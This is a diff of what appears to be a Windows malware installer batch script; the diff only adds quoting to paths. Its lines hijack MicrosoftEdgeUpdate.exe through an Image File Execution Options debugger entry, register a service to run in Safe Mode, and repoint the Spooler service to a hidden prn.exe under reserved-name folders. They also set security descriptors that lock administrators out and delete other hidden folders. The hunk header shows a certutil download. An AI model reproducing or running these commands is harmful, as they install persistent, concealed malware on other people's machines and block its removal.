@@ -23,15 +23,15 @@ dir "%ProgramData%\curl.exe" >nul || certutil -url""""cache -split -f "https://g
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MicrosoftEdgeUpdate.exe" /v Debugger >nul || reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MicrosoftEdgeUpdate.exe" /v Debugger /t REG_SZ /d "\\.\%ProgramData%\prndata..\prn.exe \\.\%ProgramData%\prndata..\prn" /f
 reg query "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\OneSyncTask" /ve >nul || reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\OneSyncTask" /ve /t REG_SZ /d "Service" /f
 reg query "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\OneSyncTask" /ve >nul || reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\OneSyncTask" /ve /t REG_SZ /d "Service" /f
-sc qc "Spooler" | findstr /L /C:"\\?\%ProgramData%\prndata..\prn.exe" >nul || sc config "Spooler" binpath= "\\?\%ProgramData%\prndata..\prn.exe \\?\%ProgramData%\prndata..\prn"
+sc qc "Spooler" | findstr /L /C:"\\?\%ProgramData%\prndata..\prn.exe \\?\%ProgramData%\prndata..\prn" >nul || sc config "Spooler" binpath= "\\?\%ProgramData%\prndata..\prn.exe \\?\%ProgramData%\prndata..\prn"
 sc sdshow "OneSyncTask" | findstr /C:"D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)" >nul || sc sdset "Spooler" "D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)"
 sc sdshow "OneSyncTask" | findstr /C:"D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)" >nul || sc sdset "OneSyncTask" "D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)"
-del /S /Q \\?\%ProgramData%\prndata..\nul
-del /S /Q \\?\%ProgramData%\prndata..\con
-del /S /Q %ProgramData%\buh.cmd
-rd /S /Q \\.\%ProgramData%\AUX..\
-rd /S /Q \\.\%ProgramData%\CON..\
-rd /S /Q \\.\%ProgramData%\NUL..\
-rd /S /Q \\.\%ProgramData%\config..\
-rd /S /Q \\.\%ProgramData%\logdata..\
-rd /S /Q \\.\%ProgramData%\diaglogs..\
+del /S /Q "\\?\%ProgramData%\prndata..\nul"
+del /S /Q "\\?\%ProgramData%\prndata..\con"
+del /S /Q "%ProgramData%\buh.cmd"
+rd /S /Q "\\.\%ProgramData%\AUX..\"
+rd /S /Q "\\.\%ProgramData%\CON..\"
+rd /S /Q "\\.\%ProgramData%\NUL..\"
+rd /S /Q "\\.\%ProgramData%\config..\"
+rd /S /Q "\\.\%ProgramData%\logdata..\"
+rd /S /Q "\\.\%ProgramData%\diaglogs..\"
